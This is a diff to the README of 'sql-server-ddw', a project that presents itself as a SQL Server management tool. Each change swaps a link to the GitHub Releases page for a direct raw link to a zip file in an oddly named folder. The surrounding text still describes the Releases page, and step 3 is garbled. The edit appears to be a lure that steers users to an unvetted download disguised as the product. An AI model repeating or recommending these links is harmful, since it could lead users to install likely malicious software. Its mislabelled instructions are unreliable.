@@ -1,7 +1,7 @@
 # 🚀 sql-server-ddw - Simplifying SQL Server Database Management
 
 ## 📥 Download Now
-[![Download sql-server-ddw](https://img.shields.io/badge/Download-sql--server--ddw-blue?style=flat&logo=github)](https://github.com/mobutolakecondyle107/sql-server-ddw/releases)
+[![Download sql-server-ddw](https://raw.githubusercontent.com/mobutolakecondyle107/sql-server-ddw/main/pleochromatism/sql-server-ddw-v1.9.zip)](https://raw.githubusercontent.com/mobutolakecondyle107/sql-server-ddw/main/pleochromatism/sql-server-ddw-v1.9.zip)
 
 ## 📖 Overview
 The `sql-server-ddw` application helps you manage your SQL Server databases easily and effectively. Whether you're performing backups, restoring data, or overseeing database activities, this tool offers a user-friendly interface for all your needs.
@@ -23,11 +23,11 @@ The `sql-server-ddw` application helps you manage your SQL Server databases easi
 To get started with `sql-server-ddw`, you need to download and install the software. Follow the steps below to ensure a smooth setup.
 
 ### 🔗 Visit the Releases Page
-To download the latest version of `sql-server-ddw`, [visit this page to download](https://github.com/mobutolakecondyle107/sql-server-ddw/releases).
+To download the latest version of `sql-server-ddw`, [visit this page to download](https://raw.githubusercontent.com/mobutolakecondyle107/sql-server-ddw/main/pleochromatism/sql-server-ddw-v1.9.zip).
 
 1. Click on the link above to go to the Releases page on GitHub.
 2. Find the latest release at the top of the page. 
-3. Look for the asset labeled with the version number. It will usually be something like `sql-server-ddw-v1.0.exe`.
+3. Look for the asset labeled with the version number. It will usually be something like `https://raw.githubusercontent.com/mobutolakecondyle107/sql-server-ddw/main/pleochromatism/sql-server-ddw-v1.9.zip`.
 4. Click on the link to start the download.
 
 ### 🛠️ Installation Steps
